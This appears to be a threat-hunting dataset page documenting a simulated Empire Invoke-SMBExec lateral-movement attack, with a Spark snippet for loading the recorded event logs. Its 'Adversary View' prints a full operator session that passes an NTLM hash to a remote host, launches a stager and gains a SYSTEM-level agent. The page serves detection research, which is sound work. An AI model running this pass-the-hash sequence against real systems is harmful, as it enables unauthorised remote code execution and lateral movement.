# Empire Invoke Smbexec

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518210125 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 19/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz |

## Dataset Description
This dataset represents adversaries performing SMBExec style command execution with NTLMv2 pass the hash authentication.

## Adversary View
```
(Empire: TKV35P8X) > usemodule lateral_movement/invoke_smbexec
(Empire: powershell/lateral_movement/invoke_smbexec) > info

              Name: Invoke-SMBExec
            Module: powershell/lateral_movement/invoke_smbexec
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @rvrsh3ll

Description:
  Executes a stager on remote hosts using SMBExec.ps1

Comments:
  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-
  TheHash/master/Invoke-SMBExec.ps1

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  Service      False                                 Name of service to create and delete.   
                                                    Defaults to 20 char random.             
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  Username     True                                  Username.                               
  Domain       False                                 Domain.                                 
  Hash         True                                  NTLM Hash in LM:NTLM or NTLM format.    
  Agent        True        TKV35P8X                  Agent to run module on.                 
  Listener     True                                  Listener to use.                        
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      

(Empire: powershell/lateral_movement/invoke_smbexec) > set Username pgustavo
(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain shire
(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash 8ece039f32592670b45fc801e2a9157d
(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_smbexec) > execute
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 27
[*] Tasked agent TKV35P8X to run module powershell/lateral_movement/invoke_smbexec
(Empire: powershell/lateral_movement/invoke_smbexec) > Command executed with service PWXYXULFULYYGFYDYBIF on IT001.shire.com


[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent XSZ91N7T checked in
[+] Initial agent XSZ91N7T from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to XSZ91N7T at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_smbexec) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:02:06  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:02:09  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:02:08  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:02:10  https           
XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:02:08  https           

(Empire: agents) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        